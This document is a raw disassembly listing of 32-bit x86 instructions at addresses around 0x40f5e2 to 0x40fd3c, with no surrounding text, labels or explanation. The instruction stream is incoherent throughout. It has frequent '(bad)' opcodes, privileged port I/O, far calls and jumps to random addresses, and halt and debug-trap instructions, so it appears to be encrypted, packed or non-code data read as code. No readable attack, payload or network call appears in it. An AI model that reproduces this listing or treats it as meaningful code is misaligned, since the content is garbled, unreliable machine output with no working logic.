  40f5e2:	jle    0x40f5ac
  40f5e4:	jle    0x40f602
  40f5e6:	stc    
  40f5e7:	add    bh,al
  40f5e9:	loope  0x40f646
  40f5eb:	sbb    ebx,ebp
  40f5ed:	pop    eax
  40f5ee:	adc    DWORD PTR [esi],esp
  40f5f0:	pop    edx
  40f5f1:	inc    esi
  40f5f2:	cld    
  40f5f3:	fnstenv [ecx+0x4b]
  40f5f6:	dec    ecx
  40f5f7:	leave  
  40f5f8:	push   eax
  40f5f9:	stc    
  40f5fa:	fwait
  40f5fb:	hlt    
  40f5fc:	adc    al,0xb5
  40f5fe:	push   esp
  40f5ff:	and    DWORD PTR [edi-0x14edaaf1],ebx
  40f605:	aam    0xcf
  40f607:	fld    DWORD PTR [esi+0x55]
  40f60a:	dec    edi
  40f60b:	push   es
  40f60c:	out    0xdf,al
  40f60e:	or     DWORD PTR [eax+0x13322305],0xffffffde
  40f615:	nop
  40f616:	(bad)  
  40f617:	nop
  40f618:	out    0xc2,eax
  40f61a:	push   ss
  40f61b:	retf   
  40f61c:	fild   DWORD PTR [ebp-0x6b]
  40f61f:	jae    0x40f5b6
  40f621:	loopne 0x40f677
  40f623:	mov    cl,0x44
  40f625:	in     al,0x58
  40f627:	push   0x3f3d27ba
  40f62c:	mov    ds:0x42b440dd,eax
  40f631:	fbld   TBYTE PTR [edx]
  40f633:	mov    ebp,DWORD PTR [eax]
  40f635:	xchg   ecx,eax
  40f636:	out    dx,eax
  40f637:	scas   eax,DWORD PTR es:[edi]
  40f638:	sub    DWORD PTR [ebx],eax
  40f63a:	xchg   BYTE PTR [esi+0x873dfec],ah
  40f640:	pcmpeqd mm1,QWORD PTR [edi-0x126511a3]
  40f647:	adc    DWORD PTR [edx+ecx*2],ecx
  40f64a:	std    
  40f64b:	pop    edx
  40f64c:	jmp    0x20c0baf7
  40f651:	fbld   TBYTE PTR [esi+0x4a638452]
  40f657:	arpl   si,dx
  40f659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f65a:	cld    
  40f65b:	hlt    
  40f65c:	clc    
  40f65d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f65e:	daa    
  40f65f:	iret   
  40f660:	jle    0x40f6d6
  40f662:	push   esp
  40f663:	(bad)  
  40f664:	sbb    edx,DWORD PTR [esi]
  40f666:	out    0xf8,al
  40f668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f669:	scas   eax,DWORD PTR es:[edi]
  40f66a:	pop    edi
  40f66b:	cld    
  40f66c:	pop    esp
  40f66d:	int3   
  40f66e:	cld    
  40f66f:	daa    
  40f670:	rcr    bl,0xfe
  40f673:	cld    
  40f674:	push   ss
  40f675:	cli    
  40f676:	in     eax,dx
  40f677:	rcr    BYTE PTR [ebx-0x1f],cl
  40f67a:	call   0xa7a9e253
  40f67f:	sub    ah,BYTE PTR [eax-0x34]
  40f682:	cld    
  40f683:	test   eax,0x90a03a67
  40f688:	mov    ebp,0xd3bcbbdb
  40f68d:	dec    eax
  40f68e:	loope  0x40f6a2
  40f690:	xor    al,0x90
  40f692:	jge    0x40f645
  40f694:	(bad)  
  40f695:	push   edi
  40f696:	pop    ss
  40f697:	(bad)  
  40f698:	jmp    0x40f6f8
  40f69a:	pop    ebp
  40f69b:	xor    DWORD PTR [ebx],ebp
  40f69d:	sub    eax,0xdf613426
  40f6a2:	sub    DWORD PTR [edx-0x78f5ed37],ecx
  40f6a8:	dec    ecx
  40f6a9:	(bad)  
  40f6ac:	push   edx
  40f6ad:	retf   0x5dac
  40f6b0:	jmp    0xd317ce1c
  40f6b5:	fild   WORD PTR [ecx-0x66cde1ef]
  40f6bb:	arpl   WORD PTR [edi-0x37080350],di
  40f6c1:	or     dh,BYTE PTR [edi-0x5f]
  40f6c4:	cmp    esi,0x14e2c458
  40f6ca:	popa   
  40f6cb:	dec    ebp
  40f6cc:	xor    BYTE PTR [eax-0x3d],ah
  40f6cf:	out    0x67,eax
  40f6d1:	outs   dx,BYTE PTR ds:[esi]
  40f6d2:	inc    eax
  40f6d3:	repnz mov eax,ds:0xeba5ef23
  40f6d9:	out    dx,eax
  40f6da:	gs loopne 0x40f6a2
  40f6dd:	push   es
  40f6de:	mov    dh,0xaf
  40f6e0:	or     eax,0xa9f6cddf
  40f6e5:	sbb    al,0xc6
  40f6e7:	pushf  
  40f6e8:	sub    DWORD PTR [ecx-0xbe27403],esi
  40f6ee:	xor    ebx,ebx
  40f6f0:	add    al,0xb0
  40f6f2:	nop
  40f6f3:	mov    bl,0x26
  40f6f5:	(bad)  
  40f6f7:	scas   eax,DWORD PTR es:[edi]
  40f6f8:	cli    
  40f6f9:	cld    
  40f6fa:	call   0x699:0xc70c34
  40f701:	dec    esp
  40f702:	mov    ebp,0xebf8aba4
  40f707:	popa   
  40f708:	das    
  40f709:	loopne 0x40f745
  40f70b:	sbb    eax,0x87a8ee02
  40f710:	jge    0x40f6f1
  40f712:	mov    al,ds:0xfd17cbbe
  40f717:	xchg   bl,bl
  40f719:	pop    ebx
  40f71a:	mov    ecx,0x2399ae0e
  40f71f:	lds    edi,FWORD PTR [edx]
  40f721:	jp     0x40f6e3
  40f723:	ds push ds
  40f725:	fmulp  st(7),st
  40f727:	add    eax,DWORD PTR [edx+edi*4-0x8]
  40f72b:	out    0x5d,eax
  40f72d:	retf   
  40f72e:	cld    
  40f72f:	int    0xd1
  40f731:	adc    DWORD PTR [edi],ebp
  40f733:	adc    esp,edx
  40f735:	ficomp DWORD PTR [eax-0x38]
  40f738:	jle    0x40f6de
  40f73a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f73b:	sub    ebp,DWORD PTR [eax+0x55]
  40f73e:	or     DWORD PTR [edx],ebx
  40f740:	out    dx,al
  40f741:	xchg   esi,eax
  40f742:	adc    DWORD PTR [ebp+0x45],edi
  40f745:	aas    
  40f746:	push   edi
  40f747:	inc    edx
  40f748:	sbb    al,0x47
  40f74a:	dec    eax
  40f74b:	retf   
  40f74c:	jl     0x40f742
  40f74e:	std    
  40f74f:	pop    ebx
  40f750:	leave  
  40f751:	xchg   edi,eax
  40f752:	push   ebp
  40f753:	mov    ah,0x13
  40f755:	cmp    al,BYTE PTR [esi-0x68]
  40f758:	sbb    BYTE PTR [ebx],0xfd
  40f75b:	inc    esi
  40f75c:	outs   dx,DWORD PTR ds:[esi]
  40f75d:	mov    edx,0x691f01c
  40f762:	dec    ebp
  40f763:	enter  0xfde5,0xb1
  40f767:	aad    0x9d
  40f769:	adc    edx,ecx
  40f76b:	int3   
  40f76c:	std    
  40f76d:	inc    ebx
  40f76e:	test   DWORD PTR [eax-0x15],0xcdeee087
  40f775:	and    eax,0x152eb79c
  40f77a:	sub    eax,0xc1ba98c8
  40f77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f780:	pop    ebx
  40f781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f782:	sti    
  40f783:	bound  esp,QWORD PTR [eax-0x2b]
  40f786:	xchg   BYTE PTR ds:0x7869c33b,bh
  40f78c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78e:	jecxz  0x40f805
  40f790:	jmp    0x40f7c5
  40f792:	scas   al,BYTE PTR es:[edi]
  40f793:	push   0xffffffad
  40f795:	inc    edx
  40f796:	jp     0x40f73b
  40f798:	mov    ds:0x675efd44,eax
  40f79d:	mov    cl,0x44
  40f79f:	and    DWORD PTR [edx-0x2037ce24],esi
  40f7a5:	add    DWORD PTR [ebp+edx*2-0x55bc8f42],0xd252b9eb
  40f7b0:	out    dx,al
  40f7b1:	in     eax,0x6c
  40f7b3:	mov    esp,0x7bd39bec
  40f7b8:	push   esp
  40f7ba:	in     al,0xfd
  40f7bc:	leave  
  40f7bd:	pop    esp
  40f7be:	cwde   
  40f7bf:	cmp    dh,BYTE PTR [edi]
  40f7c1:	inc    esp
  40f7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7c4:	das    
  40f7c5:	paddw  mm3,mm5
  40f7c8:	dec    ebx
  40f7c9:	push   esp
  40f7ca:	and    dh,BYTE PTR [ebp-0x34330e94]
  40f7d0:	xchg   ecx,eax
  40f7d1:	mov    ds:0xb42cec42,al
  40f7d6:	xchg   esp,eax
  40f7d7:	sti    
  40f7d8:	mov    bh,BYTE PTR [ecx+0x7b5b25fc]
  40f7de:	je     0x40f783
  40f7e0:	lock iret 
  40f7e2:	out    dx,eax
  40f7e3:	(bad)  
  40f7e4:	push   ebp
  40f7e5:	fild   WORD PTR [esi]
  40f7e8:	je     0x40f829
  40f7ea:	inc    ecx
  40f7eb:	(bad)  
  40f7ec:	jmp    0x40f774
  40f7ee:	ror    BYTE PTR [edx+ebp*8],0xf2
  40f7f2:	mov    eax,0x95df8d45
  40f7f7:	xchg   ebp,eax
  40f7f8:	cmp    ebp,edi
  40f7fa:	jne    0x40f79a
  40f7fc:	sub    al,0x52
  40f7fe:	and    eax,0x700100fc
  40f803:	push   esi
  40f804:	imul   eax,DWORD PTR [eax-0x7de6ac8d],0xffffff96
  40f80b:	leave  
  40f80c:	pop    ebx
  40f80d:	aaa    
  40f80e:	jge    0x40f847
  40f810:	lahf   
  40f811:	dec    eax
  40f812:	fiadd  DWORD PTR [ecx]
  40f814:	ins    DWORD PTR es:[edi],dx
  40f815:	sbb    al,0xbe
  40f817:	lds    esp,FWORD PTR [esi]
  40f819:	fmul   st,st(6)
  40f81b:	test   al,0x32
  40f81d:	mov    ds:0xa2cef0f3,eax
  40f822:	and    eax,0xb57b2cc8
  40f827:	jg     0x40f80b
  40f829:	loopne 0x40f7ec
  40f82b:	mov    WORD PTR [ecx+0x58],fs
  40f82e:	xor    BYTE PTR [eax+0x41],bh
  40f831:	mov    al,ds:0x97eb8cd8
  40f836:	retf   
  40f837:	jp     0x40f7fb
  40f839:	push   cs
  40f83a:	idiv   ch
  40f83c:	test   al,0xdf
  40f83e:	sub    eax,0xab565b49
  40f843:	int    0x41
  40f845:	iret   
  40f846:	sub    BYTE PTR [ebx+0x18bda3ea],cl
  40f84c:	fs push eax
  40f84e:	xlat   BYTE PTR ds:[ebx]
  40f84f:	test   DWORD PTR [edi-0x6b368ce8],0xababb2af
  40f859:	popf   
  40f85a:	push   esi
  40f85b:	sub    ecx,DWORD PTR [ebx+0x30]
  40f85e:	into   
  40f85f:	jno    0x40f805
  40f861:	and    ebp,0x3d
  40f864:	inc    ebx
  40f865:	faddp  st(7),st
  40f867:	in     al,dx
  40f868:	in     eax,dx
  40f869:	and    bh,BYTE PTR [ebx-0xe14dc29]
  40f86f:	(bad)  
  40f870:	dec    ecx
  40f871:	icebp  
  40f872:	int    0x1d
  40f874:	int3   
  40f875:	adc    al,0x30
  40f877:	sahf   
  40f878:	jecxz  0x40f7fd
  40f87a:	js     0x40f8c4
  40f87c:	(bad)  
  40f87d:	xchg   ebp,eax
  40f87e:	imul   eax,DWORD PTR [edi+ebx*1],0x1c8d035
  40f885:	repz push 0xffffffd2
  40f888:	mov    dl,0x1e
  40f88a:	popf   
  40f88b:	adc    al,0xeb
  40f88d:	and    BYTE PTR [ebp+0x34],bl
  40f890:	pop    edx
  40f891:	mov    ah,0x25
  40f893:	retf   
  40f894:	test   eax,esp
  40f896:	adc    ah,BYTE PTR [edx-0x2c]
  40f899:	adc    DWORD PTR [edi-0x68],ebx
  40f89c:	or     DWORD PTR ds:0x86f20237,eax
  40f8a2:	or     esi,esi
  40f8a4:	rcr    BYTE PTR [edi+0x60],1
  40f8a7:	lea    edx,[edi+edx*1-0x2bd23751]
  40f8ae:	inc    ecx
  40f8af:	(bad)  
  40f8b0:	mov    al,ds:0xbf615a5b
  40f8b5:	sbb    cl,bh
  40f8b7:	mov    DWORD PTR [ebx+0xb2154b2],0xa9c88f7b
  40f8c1:	hlt    
  40f8c2:	mov    ebx,0x1024f0ca
  40f8c7:	pushf  
  40f8c8:	jmp    0x40f8dc
  40f8ca:	jp     0x40f8e5
  40f8cc:	cs test al,0xb1
  40f8cf:	lock aas 
  40f8d1:	aad    0x7
  40f8d3:	push   0xffffffb3
  40f8d5:	lea    esp,[esi-0x5f8c1a31]
  40f8db:	pop    edi
  40f8dc:	mov    ch,0x22
  40f8de:	push   ebp
  40f8df:	dec    edx
  40f8e0:	xor    BYTE PTR [ecx],bl
  40f8e2:	and    al,0xed
  40f8e4:	fst    QWORD PTR ds:0xbe16bf08
  40f8ea:	gs aas 
  40f8ec:	and    eax,0x9d8a7a7f
  40f8f1:	cs mov ebp,0x4311816b
  40f8f7:	enter  0xff27,0xca
  40f8fb:	pushf  
  40f8fc:	mov    cl,0xe4
  40f8fe:	call   0x42ed:0x1990eb2a
  40f905:	into   
  40f906:	das    
  40f907:	fcom   QWORD PTR [ebx+0x5cf30bde]
  40f90d:	dec    ah
  40f90f:	jne    0x40f8e4
  40f911:	aas    
  40f912:	mov    bh,0x83
  40f914:	jmp    0x40f973
  40f916:	mov    ah,0xc6
  40f918:	push   0xffffffde
  40f91a:	enter  0x9290,0xea
  40f91e:	scas   al,BYTE PTR es:[edi]
  40f91f:	mov    eax,0xdf8fdffd
  40f924:	mov    BYTE PTR [ebx],0xfc
  40f927:	nop
  40f928:	jecxz  0x40f991
  40f92a:	or     ecx,eax
  40f92c:	cmp    ecx,ebx
  40f92e:	push   eax
  40f92f:	js     0x40f922
  40f931:	cmc    
  40f932:	nop
  40f933:	mov    ds:0xfca7f1a8,eax
  40f938:	inc    ecx
  40f939:	fdivrp st(1),st
  40f93b:	outs   dx,DWORD PTR ds:[esi]
  40f93c:	outs   dx,BYTE PTR ds:[esi]
  40f93d:	jp     0x40f99f
  40f93f:	sub    al,0x64
  40f941:	or     BYTE PTR [ecx+eiz*4],0xcd
  40f945:	test   ebp,edi
  40f947:	dec    eax
  40f948:	jne    0x40f8df
  40f94a:	mov    ebx,0xd20bda81
  40f94f:	xchg   ebx,eax
  40f950:	imul   edx,DWORD PTR [esi+0x5d],0xffffffd7
  40f954:	pop    eax
  40f955:	sbb    eax,ebx
  40f957:	call   0x38a3:0x76f82beb
  40f95e:	retf   
  40f95f:	(bad)  
  40f960:	jmp    0xb4653344
  40f965:	push   esi
  40f966:	mov    esp,0xfd7b525a
  40f96b:	mov    ebx,0x5e06dcfb
  40f970:	mov    ds:0xd9c8f1cf,al
  40f975:	adc    BYTE PTR [ebx-0x390bed47],0x18
  40f97c:	aam    0xb4
  40f97e:	cld    
  40f97f:	adc    esp,DWORD PTR [edi]
  40f981:	cwde   
  40f982:	fist   DWORD PTR [edi+ecx*2]
  40f985:	mov    dl,0xf3
  40f987:	mov    edx,0xc7d3a83a
  40f98c:	mov    ds,WORD PTR [ecx+0x14c033a1]
  40f992:	stos   DWORD PTR es:[edi],eax
  40f993:	int    0xea
  40f995:	js     0x40f979
  40f997:	shl    BYTE PTR [ebp-0x79f02f25],cl
  40f99d:	fnstcw WORD PTR [eax+ecx*8]
  40f9a0:	cmp    ebx,DWORD PTR [ebp-0x323d35ef]
  40f9a6:	icebp  
  40f9a7:	inc    ebp
  40f9a8:	jmp    0x40fa04
  40f9aa:	adc    ebx,DWORD PTR [ebp+0xcdc7bbe]
  40f9b0:	ds pop es
  40f9b2:	mov    al,0xc7
  40f9b4:	(bad)  
  40f9b5:	jmp    0x40fa05
  40f9b7:	dec    eax
  40f9b8:	mov    eax,0x88a38eea
  40f9bd:	dec    edi
  40f9be:	std    
  40f9bf:	cmp    eax,0xd5d10fe0
  40f9c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c5:	jns    0x40f9cb
  40f9c7:	sbb    eax,0xecd08843
  40f9cc:	jae    0x40fa42
  40f9ce:	push   ecx
  40f9cf:	enter  0xb844,0xaf
  40f9d3:	mov    ecx,0x3cfd846f
  40f9d8:	xor    ah,BYTE PTR [ebp+0x7f]
  40f9db:	out    0x56,eax
  40f9dd:	mov    fs,WORD PTR [eax]
  40f9df:	loopne 0x40fa3c
  40f9e1:	lahf   
  40f9e2:	jl     0x40f982
  40f9e4:	fwait
  40f9e5:	call   0x91fd:0x454c3bd5
  40f9ec:	enter  0x8a1,0x44
  40f9f0:	out    dx,eax
  40f9f1:	in     al,dx
  40f9f2:	sub    eax,ecx
  40f9f4:	dec    edx
  40f9f5:	out    dx,eax
  40f9f6:	jae    0x40fa0a
  40f9f8:	call   0xfe3b884d
  40f9fd:	test   eax,0x686b2169
  40fa02:	cmp    esp,DWORD PTR [ecx+eax*4]
  40fa05:	or     al,BYTE PTR [eax+0x4b572cc8]
  40fa0b:	dec    ebp
  40fa0c:	repz or eax,0x8eb18f0
  40fa12:	jmp    0x5f8b:0xfa5e9a4b
  40fa19:	jmp    0x40fa8e
  40fa1b:	int    0xff
  40fa1d:	pop    ds
  40fa1e:	cmp    bl,BYTE PTR [edx+edi*1]
  40fa21:	adc    esp,edi
  40fa23:	jmp    0x86939113
  40fa28:	ror    BYTE PTR [edx-0x20d58541],1
  40fa2e:	jns    0x40fa0c
  40fa30:	das    
  40fa31:	ja     0x40fa79
  40fa33:	cvtps2pd xmm4,xmm3
  40fa36:	std    
  40fa37:	pop    ebx
  40fa38:	push   ebp
  40fa39:	stc    
  40fa3a:	aaa    
  40fa3b:	pop    ss
  40fa3c:	jbe    0x40f9f5
  40fa3e:	lods   eax,DWORD PTR ds:[esi]
  40fa3f:	fild   QWORD PTR [edi]
  40fa41:	sbb    ecx,ecx
  40fa43:	enter  0xfe54,0x17
  40fa47:	scas   al,BYTE PTR es:[edi]
  40fa48:	and    al,0xdd
  40fa4a:	stc    
  40fa4b:	iret   
  40fa4c:	mov    al,ds:0x6bacfd03
  40fa51:	xchg   ebp,eax
  40fa52:	add    eax,0xed2938ff
  40fa57:	(bad)  
  40fa58:	jno    0x40fa8f
  40fa5a:	hlt    
  40fa5b:	push   cx
  40fa5d:	sahf   
  40fa5e:	(bad)  
  40fa5f:	jge    0x40fa4c
  40fa61:	inc    edi
  40fa62:	fs test al,0x55
  40fa65:	ror    ah,1
  40fa67:	push   ebx
  40fa68:	rcr    bh,1
  40fa6a:	mov    edx,0x37031b85
  40fa6f:	pop    ecx
  40fa70:	shr    dh,0x9e
  40fa73:	cmp    al,0xeb
  40fa75:	test   DWORD PTR [edi+0x7],ebp
  40fa78:	jp     0x40faa2
  40fa7a:	sahf   
  40fa7b:	push   edx
  40fa7c:	into   
  40fa7d:	fidivr WORD PTR [edx-0x3e6623c1]
  40fa83:	dec    ecx
  40fa84:	stc    
  40fa85:	pop    ds
  40fa86:	mov    edi,0xfca29d14
  40fa8b:	add    al,0xe8
  40fa8d:	dec    edi
  40fa8e:	fwait
  40fa8f:	arpl   WORD PTR [ebx+0x6fc8cec3],bp
  40fa95:	jbe    0x40fa6c
  40fa97:	xchg   esi,eax
  40fa98:	pop    ds
  40fa99:	cdq    
  40fa9a:	ja     0x40fae5
  40fa9c:	jmp    0x40fab5
  40fa9e:	mov    DWORD PTR [edx],esp
  40faa0:	mov    eax,0xd0be9770
  40faa5:	(bad)  
  40faa7:	xor    al,BYTE PTR ds:0xaa08d3be
  40faad:	leave  
  40faae:	cld    
  40faaf:	jbe    0x40fad1
  40fab1:	pop    esi
  40fab2:	popw   ds
  40fab4:	push   eax
  40fab5:	out    0xcb,eax
  40fab7:	enter  0x66ed,0x81
  40fabb:	lods   al,BYTE PTR ds:[esi]
  40fabc:	fsubr  DWORD PTR [edi]
  40fabe:	pushf  
  40fabf:	cmp    bl,ch
  40fac1:	rcr    BYTE PTR [esi-0x76],1
  40fac4:	jmp    DWORD PTR [edx-0x26627fca]
  40faca:	xor    BYTE PTR [eax-0x37],ah
  40facd:	jne    0x40fb2e
  40facf:	add    BYTE PTR [esi],al
  40fad1:	arpl   WORD PTR [ebp-0x35f1b4a],bx
  40fad7:	div    BYTE PTR [edi]
  40fad9:	lahf   
  40fada:	inc    esi
  40fadb:	(bad)  
  40fadc:	sbb    DWORD PTR [edx],ecx
  40fade:	cli    
  40fadf:	fisubr WORD PTR [esp+edx*1]
  40fae2:	std    
  40fae3:	and    al,0x80
  40fae5:	push   eax
  40fae6:	cwde   
  40fae7:	in     eax,0xa7
  40fae9:	fld    DWORD PTR [edx]
  40faeb:	mul    ecx
  40faed:	dec    eax
  40faee:	cmp    eax,0x7cd18981
  40faf3:	sar    BYTE PTR [ecx-0x20],cl
  40faf6:	(bad)  
  40faf7:	hlt    
  40faf8:	retf   0x88b8
  40fafb:	adc    al,0x56
  40fafd:	pop    ds
  40fafe:	xor    eax,0x8cbfe876
  40fb03:	inc    edi
  40fb04:	jmp    0x40fabd
  40fb06:	mov    cl,0x8f
  40fb08:	push   ss
  40fb09:	mov    ds:0xdfb4df24,eax
  40fb0e:	mov    ecx,0xf57b573e
  40fb13:	inc    ecx
  40fb14:	mov    edi,0xd8fd76
  40fb19:	add    edx,DWORD PTR [edx+edx*8+0x222b621f]
  40fb20:	rcr    edi,cl
  40fb22:	mov    gs,ebp
  40fb24:	xlat   BYTE PTR ds:[ebx]
  40fb25:	cdq    
  40fb26:	adc    eax,0xc06a5068
  40fb2b:	mov    esp,0x3c07655
  40fb30:	cmp    DWORD PTR [edi-0x33],ecx
  40fb33:	jae    0x40fb17
  40fb35:	(bad)  
  40fb37:	mov    bl,0xed
  40fb39:	out    0xcd,eax
  40fb3b:	add    esi,DWORD PTR [ebp+0x725dfcd4]
  40fb41:	nop
  40fb42:	inc    ebp
  40fb43:	mov    edi,0xc869cc2e
  40fb48:	iret   
  40fb49:	push   edi
  40fb4a:	and    dl,BYTE PTR [esi+ebx*8]
  40fb4d:	xor    cl,BYTE PTR [eax]
  40fb4f:	and    ecx,DWORD PTR [ebx]
  40fb51:	dec    edx
  40fb52:	std    
  40fb53:	xor    al,0x61
  40fb55:	mov    esp,DWORD PTR [ecx+edx*2]
  40fb58:	cld    
  40fb59:	sub    dh,BYTE PTR [edx-0x24]
  40fb5c:	ins    BYTE PTR es:[edi],dx
  40fb5d:	ret    0x87fc
  40fb60:	fs xchg ebp,eax
  40fb62:	outs   dx,DWORD PTR ds:[esi]
  40fb63:	sbb    esi,DWORD PTR [edx-0x14ddd10e]
  40fb69:	pop    es
  40fb6a:	or     BYTE PTR [ecx+0x61],dl
  40fb6d:	and    eax,DWORD PTR [edi+0xa]
  40fb70:	pop    es
  40fb71:	fistp  WORD PTR ds:0x1305d54f
  40fb77:	repz cmc 
  40fb79:	scas   al,BYTE PTR es:[edi]
  40fb7a:	cld    
  40fb7b:	leave  
  40fb7c:	jle    0x40fbca
  40fb7e:	xor    dl,dl
  40fb80:	bound  edi,QWORD PTR [ecx]
  40fb82:	and    cl,al
  40fb84:	pop    es
  40fb85:	or     edi,DWORD PTR [edi-0x4b5ab7e8]
  40fb8b:	sub    eax,0x98bc5cea
  40fb90:	or     BYTE PTR [ebx+0x70],ah
  40fb93:	jo     0x40fbf4
  40fb95:	stc    
  40fb96:	inc    esp
  40fb97:	enter  0x47d0,0x6a
  40fb9b:	push   edx
  40fb9c:	cmp    BYTE PTR [ebp-0x5214ed16],bh
  40fba2:	adc    bh,BYTE PTR [ebx]
  40fba4:	out    0xe5,eax
  40fba6:	aas    
  40fba7:	sub    edx,DWORD PTR [ebp-0x21]
  40fbaa:	pop    edx
  40fbab:	call   0x6ff35562
  40fbb0:	mov    DWORD PTR [edi-0x3],eax
  40fbb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb4:	popa   
  40fbb5:	lods   eax,DWORD PTR ds:[esi]
  40fbb6:	add    ecx,edx
  40fbb8:	add    DWORD PTR ds:0x3538c7ee,edi
  40fbbe:	lock std 
  40fbc0:	mov    eax,ds:0xeabb181d
  40fbc5:	leave  
  40fbc6:	jg     0x40fc2d
  40fbc8:	adc    ah,al
  40fbca:	cmc    
  40fbcb:	daa    
  40fbcc:	inc    ebx
  40fbcd:	ss jne 0x40fb99
  40fbd0:	int3   
  40fbd1:	fidivr DWORD PTR [edi+0x24f592dd]
  40fbd7:	adc    eax,0x4f5753f2
  40fbdc:	out    0xcd,al
  40fbde:	inc    edx
  40fbdf:	mov    ecx,0xb15e40b2
  40fbe4:	and    BYTE PTR [ebx],dh
  40fbe6:	rcl    esp,0x8f
  40fbe9:	ffreep st(7)
  40fbeb:	pop    ds
  40fbec:	pop    ds
  40fbed:	push   ecx
  40fbee:	add    ebp,ecx
  40fbf0:	add    eax,0xd91ff431
  40fbf5:	mov    edx,DWORD PTR [ebx-0x36]
  40fbf8:	mov    al,ds:0xcf8841c1
  40fbfd:	and    DWORD PTR [ebx-0x38],eax
  40fc00:	pop    ss
  40fc01:	into   
  40fc02:	jp     0x40fc1a
  40fc04:	mov    ebx,0xddc9a68a
  40fc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc0a:	push   0xffffffc8
  40fc0c:	mov    dh,0xf9
  40fc0e:	mov    edi,0x88ed9f12
  40fc13:	(bad)  
  40fc14:	rol    DWORD PTR [esp+ecx*4],cl
  40fc17:	fs xchg ebp,eax
  40fc19:	iret   
  40fc1a:	lods   eax,DWORD PTR ds:[esi]
  40fc1b:	push   ebx
  40fc1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc1d:	and    ch,bh
  40fc1f:	mov    esp,esp
  40fc21:	outs   dx,DWORD PTR ds:[esi]
  40fc22:	enter  0xf69e,0x45
  40fc26:	jl     0x40fbf0
  40fc28:	mov    ch,BYTE PTR [esi]
  40fc2a:	and    dl,BYTE PTR [ecx]
  40fc2c:	xor    cl,0x5f
  40fc2f:	mov    eax,ds:0x765a8cff
  40fc34:	cmpps  xmm7,xmm4,0xb8
  40fc38:	mov    ebx,DWORD PTR [ebx-0x20cc34c8]
  40fc3e:	lods   eax,DWORD PTR ds:[esi]
  40fc3f:	jl     0x40fc8b
  40fc41:	clc    
  40fc42:	fcmovu st,st(3)
  40fc44:	push   ecx
  40fc45:	(bad)  
  40fc46:	stos   BYTE PTR es:[edi],al
  40fc47:	int    0xeb
  40fc49:	(bad)  
  40fc4a:	ret    
  40fc4b:	add    al,BYTE PTR [ecx+0x5f6a1609]
  40fc51:	call   0x201db31f
  40fc56:	push   0xa6cbf252
  40fc5b:	loope  0x40fc48
  40fc5d:	pop    es
  40fc5e:	sub    BYTE PTR [ecx+0x67e97169],cl
  40fc64:	pop    esp
  40fc65:	ffreep st(1)
  40fc67:	push   ebp
  40fc68:	fmul   DWORD PTR [eax]
  40fc6a:	lods   al,BYTE PTR ds:[esi]
  40fc6b:	adc    eax,0x66fdb4f5
  40fc70:	push   edi
  40fc71:	mov    ds:0x4c52942e,al
  40fc76:	fnstsw WORD PTR [esi]
  40fc78:	ins    DWORD PTR es:[edi],dx
  40fc79:	fistp  QWORD PTR [ebx+eax*2+0x6]
  40fc7d:	out    0xb6,al
  40fc7f:	pop    esi
  40fc80:	fist   DWORD PTR [edi*8-0x208a998b]
  40fc87:	cmp    BYTE PTR [ebx-0x7273c3b8],bh
  40fc8d:	js     0x40fc8c
  40fc8f:	ins    BYTE PTR es:[edi],dx
  40fc90:	call   0xf2bc:0x81c7a2fa
  40fc97:	xor    DWORD PTR [ecx+0x16],esi
  40fc9a:	mov    eax,0x57972b7e
  40fc9f:	int    0x82
  40fca1:	sub    cl,bl
  40fca3:	shr    bh,1
  40fca5:	pop    ecx
  40fca6:	xor    ch,BYTE PTR [esi]
  40fca8:	xchg   ebp,eax
  40fca9:	jbe    0x40fca8
  40fcab:	ffree  st(2)
  40fcad:	repz inc esi
  40fcaf:	ds ja  0x40fce7
  40fcb2:	sbb    cl,al
  40fcb4:	call   0x8bde1b19
  40fcb9:	or     bl,BYTE PTR [edx+ecx*4]
  40fcbc:	and    DWORD PTR [edx],edi
  40fcbe:	std    
  40fcbf:	xchg   BYTE PTR [edi-0x10c3ed6e],bh
  40fcc5:	jle    0x40fcb4
  40fcc7:	(bad)  
  40fcc8:	dec    ecx
  40fcc9:	fnstenv ds:0x3964c0f6
  40fccf:	in     eax,dx
  40fcd0:	in     al,0x3
  40fcd2:	jno    0x40fc9c
  40fcd4:	cld    
  40fcd5:	sub    eax,0x80e63c5
  40fcda:	cmp    al,cl
  40fcdc:	ds sbb edi,esp
  40fcdf:	fcomp  DWORD PTR [ebx+0xbd805fa]
  40fce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fce6:	cld    
  40fce7:	test   DWORD PTR [edi],0xf8761a18
  40fced:	add    ch,BYTE PTR [ebx]
  40fcef:	enter  0xaf48,0xc3
  40fcf3:	retf   0xf7e4
  40fcf6:	pop    edx
  40fcf7:	add    eax,0xdb7538eb
  40fcfc:	sub    edx,DWORD PTR [eax]
  40fcfe:	mov    esi,0x4edf42f1
  40fd03:	fisub  DWORD PTR [eax-0x4b]
  40fd06:	cmp    BYTE PTR [ecx-0x20],al
  40fd09:	ins    DWORD PTR es:[edi],dx
  40fd0a:	std    
  40fd0b:	call   0x2eb78535
  40fd10:	aas    
  40fd11:	inc    edi
  40fd12:	add    eax,0xfcf954e3
  40fd17:	(bad)  
  40fd18:	jl     0x40fcd1
  40fd1a:	ret    0xc6b1
  40fd1d:	push   ecx
  40fd1e:	add    DWORD PTR [edx+0x757dae32],esi
  40fd24:	loopne 0x40fcd0
  40fd26:	aas    
  40fd27:	cmp    ch,BYTE PTR [edi]
  40fd29:	mov    eax,0x5461bde0
  40fd2e:	invd   
  40fd30:	jecxz  0x40fd81
  40fd32:	or     BYTE PTR [edx-0x4402bfb9],0x60
  40fd39:	stos   DWORD PTR es:[edi],eax
  40fd3a:	(bad)  
  40fd3b:	icebp  
  40fd3c:	xor    BYTE PTR [eax],dh
